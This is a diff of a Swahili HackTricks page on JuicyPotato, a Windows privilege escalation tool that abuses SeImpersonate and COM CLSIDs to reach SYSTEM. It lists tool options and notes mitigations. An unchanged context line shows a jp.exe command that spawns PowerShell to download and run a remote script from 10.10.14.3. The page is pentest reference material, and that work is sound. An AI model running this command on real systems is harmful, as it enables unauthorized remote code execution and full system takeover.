@@ -2,16 +2,15 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-> [!WARNING]
-> **JuicyPotato haitumiki** kwenye Windows Server 2019 na Windows 10 build 1809 kuendelea. Hata hivyo, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) zinaweza kutumika **kuchukua madaraka sawa na kupata ufikiaji wa kiwango cha `NT AUTHORITY\SYSTEM`**. _**Angalia:**_
+> [!WARNING] > **JuicyPotato haitumiki** kwenye Windows Server 2019 na Windows 10 build 1809 kuendelea. Hata hivyo, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) zinaweza kutumika **kuchukua faida ya ruhusa sawa na kupata `NT AUTHORITY\SYSTEM`** kiwango cha ufikiaji. _**Angalia:**_
 
 {{#ref}}
 roguepotato-and-printspoofer.md
 {{#endref}}
 
-## Juicy Potato (kutumia madaraka ya dhahabu) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>
+## Juicy Potato (kutumia ruhusa za dhahabu) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>
 
-_Toleo lililo na sukari la_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, likiwa na kidogo cha juisi, yaani **chombo kingine cha Kupanua Madaraka ya Mitaa, kutoka Akaunti za Huduma za Windows hadi NT AUTHORITY\SYSTEM**_
+_Toleo lililo na sukari la_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, likiwa na kidogo cha juisi, yaani **chombo kingine cha Kupanua Ruhusa za Mitaa, kutoka Akaunti za Huduma za Windows hadi NT AUTHORITY\SYSTEM**_
 
 #### Unaweza kupakua juicypotato kutoka [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)
 
@@ -19,19 +18,19 @@ _Toleo lililo na sukari la_ [_RottenPotatoNG_](https://github.com/breenmachine/R
 
 [**Kutoka kwa juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**
 
-[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) na [mabadiliko yake](https://github.com/decoder-it/lonelypotato) yanatumia mnyororo wa kupanua madaraka kulingana na [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [huduma](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) ikiwa na msikilizaji wa MiTM kwenye `127.0.0.1:6666` na unapokuwa na madaraka ya `SeImpersonate` au `SeAssignPrimaryToken`. Wakati wa ukaguzi wa toleo la Windows tuligundua usanidi ambapo `BITS` ulikuwa umezimwa kwa makusudi na bandari `6666` ilikuwa imechukuliwa.
+[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) na [mifano zake](https://github.com/decoder-it/lonelypotato) zinatumia mnyororo wa kupanua ruhusa kulingana na [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [huduma](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) ikiwa na msikilizaji wa MiTM kwenye `127.0.0.1:6666` na unapokuwa na ruhusa za `SeImpersonate` au `SeAssignPrimaryToken`. Wakati wa ukaguzi wa toleo la Windows tuligundua usanidi ambapo `BITS` ulikuwa umezimwa makusudi na bandari `6666` ilikuwa imechukuliwa.
 
-Tuliamua kuunda silaha [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Sema hello kwa Juicy Potato**.
+Tuliamua kuunda silaha [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Sema salamu kwa Juicy Potato**.
 
-> Kwa nadharia, angalia [Rotten Potato - Kupanua Madaraka kutoka Akaunti za Huduma hadi SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) na ufuate mnyororo wa viungo na marejeleo.
+> Kwa nadharia, angalia [Rotten Potato - Kupanua Ruhusa kutoka Akaunti za Huduma hadi SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) na ufuate mnyororo wa viungo na marejeleo.
 
-Tuligundua kwamba, mbali na `BITS` kuna seva kadhaa za COM tunaweza kutumia vibaya. Zinahitaji tu:
+Tuligundua kwamba, mbali na `BITS` kuna seva kadhaa za COM tunaweza kutumia. Zinahitaji tu:
 
-1. kuwa na uwezo wa kuanzishwa na mtumiaji wa sasa, kawaida "mtumiaji wa huduma" ambaye ana madaraka ya kuiga
+1. kuwa na uwezo wa kuanzishwa na mtumiaji wa sasa, kawaida "mtumiaji wa huduma" ambaye ana ruhusa za kuiga
 2. kutekeleza interface ya `IMarshal`
 3. kukimbia kama mtumiaji aliyeinuliwa (SYSTEM, Administrator, …)
 
-Baada ya majaribio kadhaa tulipata na kujaribu orodha kubwa ya [CLSID za kuvutia](http://ohpe.it/juicy-potato/CLSID/) kwenye toleo mbalimbali za Windows.
+Baada ya majaribio kadhaa tulipata na kujaribu orodha kubwa ya [CLSID za kuvutia](http://ohpe.it/juicy-potato/CLSID/) kwenye toleo kadhaa za Windows.
 
 ### Maelezo ya Juicy <a href="#juicy-details" id="juicy-details"></a>
 
@@ -40,15 +39,15 @@ JuicyPotato inakuwezesha:
 - **CLSID ya Lengo** _chagua CLSID yoyote unayotaka._ [_Hapa_](http://ohpe.it/juicy-potato/CLSID/) _unaweza kupata orodha iliyopangwa kwa OS._
 - **Bandari ya Kusikiliza ya COM** _mwelekeo wa bandari ya kusikiliza ya COM unayopendelea (badala ya 6666 iliyowekwa kwenye marshalled)_
 - **Anwani ya IP ya Kusikiliza ya COM** _fungua seva kwenye IP yoyote_
-- **Njia ya uundaji wa mchakato** _kulingana na madaraka ya mtumiaji aliyeigizwa unaweza kuchagua kutoka:_
+- **Njia ya uundaji wa mchakato** _kulingana na ruhusa za mtumiaji aliyeiga unaweza kuchagua kutoka:_
 - `CreateProcessWithToken` (inahitaji `SeImpersonate`)
 - `CreateProcessAsUser` (inahitaji `SeAssignPrimaryToken`)
 - `zote`
-- **Mchakato wa kuzindua** _zindua executable au script ikiwa unyakuzi unafanikiwa_
-- **Hoja za Mchakato** _binafsisha hoja za mchakato uliozinduliwa_
+- **Mchakato wa kuzindua** _zindua executable au script ikiwa unyakuzi utafaulu_
+- **Argument ya Mchakato** _binafsisha hoja za mchakato uliozinduliwa_
 - **Anwani ya Seva ya RPC** _kwa njia ya siri unaweza kujiandikisha kwa seva ya RPC ya nje_
 - **Bandari ya Seva ya RPC** _inafaa ikiwa unataka kujiandikisha kwa seva ya nje na firewall inazuia bandari `135`…_
-- **MODE YA TESTI** _hasa kwa madhumuni ya majaribio, yaani, kujaribu CLSIDs. Inaunda DCOM na kuchapisha mtumiaji wa token. Angalia_ [_hapa kwa majaribio_](http://ohpe.it/juicy-potato/Test/)
+- **MTIHANI wa hali** _hasa kwa madhumuni ya majaribio, yaani. kujaribu CLSIDs. Inaunda DCOM na kuchapisha mtumiaji wa token. Angalia_ [_hapa kwa majaribio_](http://ohpe.it/juicy-potato/Test/)
 
 ### Matumizi <a href="#usage" id="usage"></a>
 ```
@@ -75,7 +74,7 @@ Ikiwa mtumiaji ana `SeImpersonate` au `SeAssignPrimaryToken` ruhusa basi wewe ni
 
 Ni karibu haiwezekani kuzuia matumizi mabaya ya COM Servers hizi zote. Unaweza kufikiria kubadilisha ruhusa za vitu hivi kupitia `DCOMCNFG` lakini bahati njema, hii itakuwa changamoto.
 
-Suluhisho halisi ni kulinda akaunti na programu nyeti ambazo zinafanya kazi chini ya akaunti za `* SERVICE`. Kuzuia `DCOM` hakika kutazuia exploit hii lakini kunaweza kuwa na athari kubwa kwenye OS inayotegemea.
+Suluhisho halisi ni kulinda akaunti nyeti na programu ambazo zinafanya kazi chini ya akaunti za `* SERVICE`. Kuzuia `DCOM` hakika kutazuia exploit hii lakini kunaweza kuwa na athari kubwa kwenye OS inayotegemea.
 
 Kutoka: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)
 
@@ -100,7 +99,7 @@ c:\Users\Public>
 ```
 .\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
 ```
-### Uzinduzi wa CMD mpya (ikiwa una ufikiaji wa RDP)
+### Anzisha CMD mpya (ikiwa una ufikiaji wa RDP)
 
 ![](<../../images/image (300).png>)
 
@@ -108,7 +107,9 @@ c:\Users\Public>
 
 Mara nyingi, CLSID ya kawaida ambayo JuicyPotato inatumia **haifanyi kazi** na exploit inashindwa. Kawaida, inachukua majaribio kadhaa kupata **CLSID inayofanya kazi**. Ili kupata orodha ya CLSIDs za kujaribu kwa mfumo maalum wa uendeshaji, unapaswa kutembelea ukurasa huu:
 
-{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}
+{{#ref}}
+https://ohpe.it/juicy-potato/CLSID/
+{{#endref}}
 
 ### **Kuangalia CLSIDs**
 
